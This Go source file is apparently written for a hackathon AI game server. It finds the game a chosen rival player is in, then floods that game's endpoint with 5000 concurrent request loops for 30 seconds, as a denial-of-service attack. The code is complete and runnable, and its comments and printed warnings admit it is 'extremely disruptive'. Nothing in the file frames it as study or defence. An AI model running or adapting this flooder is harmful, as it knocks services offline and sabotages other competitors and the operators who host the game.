package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"sync"
	"sync/atomic"
	"time"
)

// --- Configuration ---
const (
	// IMPORTANT: Replace with actual API base URL
	baseURL = "http://eah-2025-ai-jam.dev.elastic.cloud:8082"

	// IMPORTANT: Set the Player ID whose game you want to target
	targetPlayerID = "example-bot-go" // Example Player ID

	// Number of concurrent goroutines to attack the gameID endpoint
	// WARNING: 5000 is a very high number and can be extremely disruptive.
	// Test with much smaller numbers first (e.g., 50-100).
	numAttackers = 5000

	// Duration of the attack in seconds
	attackDurationSeconds = 30

	// Timeout for individual HTTP requests
	requestTimeout = 10 * time.Second

	// Retry mechanism for finding the player's game
	findPlayerRetryDelaySeconds = 1   // How long to wait between attempts to find the player
	maxFindPlayerAttempts       = 100 // Max attempts to find player (e.g., 12 attempts * 10s = 2 minutes)
)

// --- Structs for /api/v0/games endpoint ---
type ListedPlayer struct {
	PlayerID string `json:"player_id"`
	Chips    int    `json:"chips"`
}

type ListedGameState struct {
	GameID  string         `json:"game_id"` // game_id is often duplicated here
	Players []ListedPlayer `json:"players"`
}

type ListedGame struct {
	GameID    string          `json:"game_id"`
	GameState ListedGameState `json:"game_state"`
	Timestamp string          `json:"timestamp"`
}

// --- Global Counters ---
var (
	requestsSent   int64
	successfulHits int64
	failedHits     int64
	// targetGameIDFound bool // Replaced by direct return from findTargetPlayerGameID
)

// --- Helper to make HTTP GET and unmarshal ---
func getAndUnmarshal(url string, target interface{}) error {
	client := &http.Client{Timeout: requestTimeout}
	// fmt.Printf("DEBUG: Requesting URL: %s\n", url) // Uncomment for debugging
	resp, err := client.Get(url)
	if err != nil {
		return fmt.Errorf("error making GET request to %s: %w", url, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		bodyBytes, _ := io.ReadAll(resp.Body) // Try to read body for error context
		// fmt.Printf("DEBUG: Non-200 response from %s. Status: %d. Body: %s\n", url, resp.StatusCode, string(bodyBytes)) // Uncomment for debugging
		return fmt.Errorf("received non-200 status code from %s: %d %s. Body: %s", url, resp.StatusCode, resp.Status, string(bodyBytes))
	}

	if err := json.NewDecoder(resp.Body).Decode(target); err != nil {
		return fmt.Errorf("error decoding JSON from %s: %w", url, err)
	}
	return nil
}

// --- Function to find a gameID where the target player is playing ---
// Returns the gameID if found, or an empty string and error if not.
func findTargetPlayerGameIDInCurrentList(playerIDToFind string) (string, error) {
	// Construct URL: /api/v0/games?limit={listGamesLimit} (default type is game_start)
	url := fmt.Sprintf("%s/api/v0/games", baseURL)

	var listedGames []ListedGame // API returns a JSON array of games
	err := getAndUnmarshal(url, &listedGames)
	if err != nil {
		return "", fmt.Errorf("failed to fetch list of games: %w", err)
	}

	if len(listedGames) == 0 {
		return "", fmt.Errorf("no games found in the list from /api/v0/games (empty list received)")
	}

	// fmt.Printf("Found %d games in the list. Searching for player %s...\n", len(listedGames), playerIDToFind) // Can be verbose in a loop
	for _, game := range listedGames {
		if game.GameState.Players != nil {
			for _, player := range game.GameState.Players {
				if player.PlayerID == playerIDToFind {
					fmt.Printf("Found player %s in gameID: %s\n", playerIDToFind, game.GameID)
					return game.GameID, nil
				}
			}
		}
	}
	// Player not found in this specific list
	return "", nil
}

// --- Attacker goroutine ---
func attackWorker(gameIDToAttack string, stopSignal <-chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()
	client := &http.Client{
		Timeout: requestTimeout,
	}
	attackURL := fmt.Sprintf("%s/games/%s", baseURL, gameIDToAttack)

	for {
		select {
		case <-stopSignal: // Check if the attack duration is over
			return
		default:
			atomic.AddInt64(&requestsSent, 1)
			resp, err := client.Get(attackURL)
			if err != nil {
				atomic.AddInt64(&failedHits, 1)
				time.Sleep(50 * time.Millisecond)
				continue
			}

			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				atomic.AddInt64(&successfulHits, 1)
			} else {
				atomic.AddInt64(&failedHits, 1)
			}
		}
	}
}

// --- Main ---
func main() {
	fmt.Println("--- GameID DoS Attacker (Game List Method with Retry) ---")
	fmt.Printf("WARNING: This script will attempt to flood requests to /api/v0/games/{gameID}.\n")
	fmt.Printf("Target Base URL: %s\n", baseURL)
	fmt.Printf("Target PlayerID for GameID discovery: %s\n", targetPlayerID)
	fmt.Printf("Number of concurrent attackers: %d\n", numAttackers)
	fmt.Printf("Attack Duration: %d seconds\n", attackDurationSeconds)
	fmt.Printf("Retry finding player for up to %d attempts, with %d seconds delay.\n", maxFindPlayerAttempts, findPlayerRetryDelaySeconds)
	fmt.Println("This can be extremely disruptive. Use responsibly and within hackathon rules.")
	fmt.Println("-----------------------------------------")

	var gameIDToAttack string
	var err error
	foundPlayer := false

	fmt.Printf("Attempting to find player %s in an active game...\n", targetPlayerID)
	for attempt := 1; attempt <= maxFindPlayerAttempts; attempt++ {
		fmt.Printf("Attempt %d/%d to find player %s...\n", attempt, maxFindPlayerAttempts, targetPlayerID)
		gameIDToAttack, err = findTargetPlayerGameIDInCurrentList(targetPlayerID)
		if err != nil {
			// This error is from getAndUnmarshal or if the game list was empty but an error occurred during fetch
			fmt.Fprintf(os.Stderr, "  Error during attempt %d to find player's game: %v\n", attempt, err)
		} else if gameIDToAttack != "" {
			// Player found
			foundPlayer = true
			break
		}

		// Player not found in this attempt, or an error occurred where the list might have been empty
		if gameIDToAttack == "" && err == nil { // Specifically, player not in the list, no other error
			fmt.Printf("  Player %s not found in current game list (attempt %d/%d).\n", targetPlayerID, attempt, maxFindPlayerAttempts)
		}

		if attempt < maxFindPlayerAttempts {
			fmt.Printf("  Will retry in %d seconds...\n", findPlayerRetryDelaySeconds)
			time.Sleep(time.Duration(findPlayerRetryDelaySeconds) * time.Second)
		}
	}

	if !foundPlayer {
		fmt.Fprintf(os.Stderr, "Error: Could not find player %s in any game after %d attempts. Exiting.\n", targetPlayerID, maxFindPlayerAttempts)
		os.Exit(1)
	}
	// If we reach here, gameIDToAttack is set and player was found.

	fmt.Printf("Starting DoS attack on gameID %s for %d seconds with %d attackers...\n", gameIDToAttack, attackDurationSeconds, numAttackers)

	var wg sync.WaitGroup
	stopSignal := make(chan struct{})

	for i := 0; i < numAttackers; i++ {
		wg.Add(1)
		go attackWorker(gameIDToAttack, stopSignal, &wg)
	}

	attackEndTime := time.Now().Add(time.Duration(attackDurationSeconds) * time.Second)
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	running := true
	for running {
		select {
		case <-ticker.C:
			if time.Now().After(attackEndTime) {
				running = false
			}
		case <-stopSignal:
			running = false
		}
	}
	close(stopSignal)

	fmt.Println("\nAttack duration ended. Waiting for workers to finish...")
	wg.Wait()

	fmt.Println("-----------------------------------------")
	fmt.Println("Attack finished.")
	fmt.Printf("Total requests sent: %d\n", atomic.LoadInt64(&requestsSent))
	fmt.Printf("Successful hits (200 OK): %d\n", atomic.LoadInt64(&successfulHits))
	fmt.Printf("Failed hits (errors or non-200): %d\n", atomic.LoadInt64(&failedHits))
	fmt.Println("-----------------------------------------")
}
